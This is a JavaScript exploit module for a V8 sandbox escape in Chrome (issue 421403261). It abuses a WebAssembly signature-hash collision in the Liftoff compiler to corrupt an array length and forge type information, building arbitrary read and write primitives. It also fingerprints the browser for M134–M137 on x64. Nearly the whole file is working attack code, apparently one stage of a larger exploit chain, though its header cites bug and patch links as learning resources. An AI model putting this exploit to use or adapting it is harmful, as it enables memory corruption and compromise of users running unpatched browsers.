/*
    V8 Sandbox escape, issue 421403261
    Build arbRead() & arbWrite() primitives
    SANDBOX_BASE has to be retrieved using other means (eg, PartitionAlloc metadata)
    Work only on x64

    Signature hash i32/i64 collision in Liftoff

    Affected versions:
        - V8: < 13.9.66, < 13.8.258.13, < 13.7.152.15 (introduced in 13.4.99)
        - Chrome Stable: M134 - M137, < 137.0.7151.119 (x64 only)

    Learning resources:
        - https://issues.chromium.org/issues/421403261
        - https://chromium-review.googlesource.com/c/v8/v8/+/6611066
*/
{
    let versioncheck = (FINGERPRINT.browser.chromium_version.major >= 134) &&
        (FINGERPRINT.browser.chromium_version.major <= 137) &&
        (FINGERPRINT.platform.arch === "x64");
    if (!versioncheck)
        log("[-] Target likely not vulnerable to 421403261", 1);
    assert(FINGERPRINT.platform.bitness !== "32", "[-] V8 sandbox is disabled on 32-bit systems", 0);


    // Offsets & V8 SBX utils
    const kMapOffset = 0;
    const kWasmArrayLength = 0x8;
    const kFixedArrayElement0Offset = 0x8;
    const kTypeInfoSupertypesOffset = 0x10;
    const kFuncRefMapTypeInfoOffset = 0x14;
    const kWasmGlobalObjectTaggedBufferOffset = 0x14;

    let getField = (obj, offset) => {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        return sbxMemory.getUint32(untagPtr(obj) + offset, true);
    }

    let setField = (obj, offset, value) => {
        assert(isStrongTaggedPtr(obj), "[-] Invalid pointer: 0x" + hex(obj));
        sbxMemory.setUint32(untagPtr(obj) + offset, value, true);
    }


    // WASM Builder & Types
    let builder = new WasmModuleBuilder();
    let $u8arr = builder.addArray(kWasmI8, true);
    let $sig_i_l = builder.addType(kSig_i_l, kNoSuperType, false);
    let $sig_l_l = builder.addType(kSig_l_l, kNoSuperType, false);
    let $sig_u8arr_i = builder.addType(makeSig([kWasmI32], [wasmRefType($u8arr)]));
    let $sig_i_u8arrl = builder.addType(makeSig([wasmRefType($u8arr), kWasmI64], [kWasmI32]));
    let $sig_v_u8arrli = builder.addType(makeSig([wasmRefType($u8arr), kWasmI64, kWasmI32], []));

    builder.addFunction('fn_i_l', $sig_i_l).addBody([...wasmI32Const(0)]).exportFunc();
    let $fn_l_l = builder.addFunction('fn_l_l', $sig_l_l).addBody([kExprLocalGet, 0]).exportFunc();
    let $t = builder.addTable(kWasmAnyFunc, 1, 1, [kExprRefFunc, ...wasmSignedLeb($fn_l_l.index)]);

    builder.addFunction('alloc_u8arr', $sig_u8arr_i).addBody([
        kExprLocalGet, 0,
        kGCPrefix, kExprArrayNewDefault, $u8arr,
    ]).exportFunc();


    // Read/Write WASM functions
    // Confuse i64 into i32 with a signature hash compatible function (i64->i64 vs i64->i32)
    // (+ use kWasmI8 to avoid i32 shl)
    builder.addFunction(`u8arr_get`, $sig_i_u8arrl).addBody([
        kExprLocalGet, 0,
        kExprLocalGet, 1,
        ...wasmI32Const(0),
        kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),
        kGCPrefix, kExprArrayGetU, ...wasmSignedLeb($u8arr),
    ]).exportFunc();

    builder.addFunction(`u8arr_set`, $sig_v_u8arrli).addBody([
        kExprLocalGet, 0,
        kExprLocalGet, 1,
        ...wasmI32Const(0),
        kExprCallIndirect, ...wasmSignedLeb($sig_i_l), ...wasmSignedLeb($t.index),
        kExprLocalGet, 2,
        kGCPrefix, kExprArraySet, ...wasmSignedLeb($u8arr),
    ]).exportFunc();


    // Signature confusion utilities
    let extract_wasmglobal_value = (global) => {
        let pbuf = getField(addrOf(global), kWasmGlobalObjectTaggedBufferOffset);
        let pval = getField(pbuf, kFixedArrayElement0Offset);
        return pval;
    }

    let set_supertype = (sub_fn, super_fn) => {
        let g = new WebAssembly.Global({value: 'anyfunc', mutable: true});

        g.value = sub_fn;
        let funcref_sub = extract_wasmglobal_value(g);
        let map_sub = getField(funcref_sub, kMapOffset);
        let typeinfo_sub = getField(map_sub, kFuncRefMapTypeInfoOffset);

        g.value = super_fn;
        let funcref_sup = extract_wasmglobal_value(g);
        let map_sup = getField(funcref_sup, kMapOffset);

        setField(typeinfo_sub, kTypeInfoSupertypesOffset, map_sup);
    }


    // Setup OOB read/write
    // Set u8arr length to 0xffffffff, so the int32 length check will always pass
    let oob = () => {
        let run = () => {
            let instance = builder.instantiate();
            let {fn_i_l, fn_l_l, alloc_u8arr, u8arr_get, u8arr_set} = instance.exports;

            let u8arr = alloc_u8arr(0x1);
            let u8arr_addr = addrOf(u8arr);
            setField(u8arr_addr, kWasmArrayLength, 0xffffffff);
            set_supertype(fn_l_l, fn_i_l);

            return [u8arr_get, u8arr_set, u8arr, u8arr_addr];
        }
        return run();
    }


    // SANDBOX_BASE has to be retrieved by other means (eg, PartitionAlloc metadata)
    // Else, primitives will be only OOB read/write relative to the sandbox base address
    var SANDBOX_BASE;


    // arbRead() & arbWrite() primitives
    // Setup OOB on each call to prevent optimization
    function arbRead(addr) {
        let run = () => {
            let sbx_base = typeof SANDBOX_BASE === "undefined" ? 0x0n : SANDBOX_BASE;
            let [u8arr_get, _, u8arr, u8arr_addr] = oob();
            let val = 0x0n;
            for (let i = 0n; i < 8n; i++) {
                let u8val = u8arr_get(u8arr, addr - sbx_base - BigInt(u8arr_addr) - 0xbn + i);
                val += BigInt(u8val) << i*8n;
            }
            return val;
        }
        return run();
    }

    function arbWrite(addr, val) {
        let run = () => {
            let sbx_base = typeof SANDBOX_BASE === "undefined" ? 0x0n : SANDBOX_BASE;
            let [_, u8arr_set, u8arr, u8arr_addr] = oob();
            for (let i = 0n; i < 8n; i++) {
                u8arr_set(u8arr, addr - sbx_base - BigInt(u8arr_addr) - 0xbn + i, Number((val >> i*8n) & 0xffn));
            }
        }
        return run();
    }

    assertTry(
        () => arbRead(0n),
        "[-] Failed to escape the V8 sandbox using issue 421403261",
    );

    log("[+] Successfully escaped the V8 sandbox using issue 421403261", 1);
}
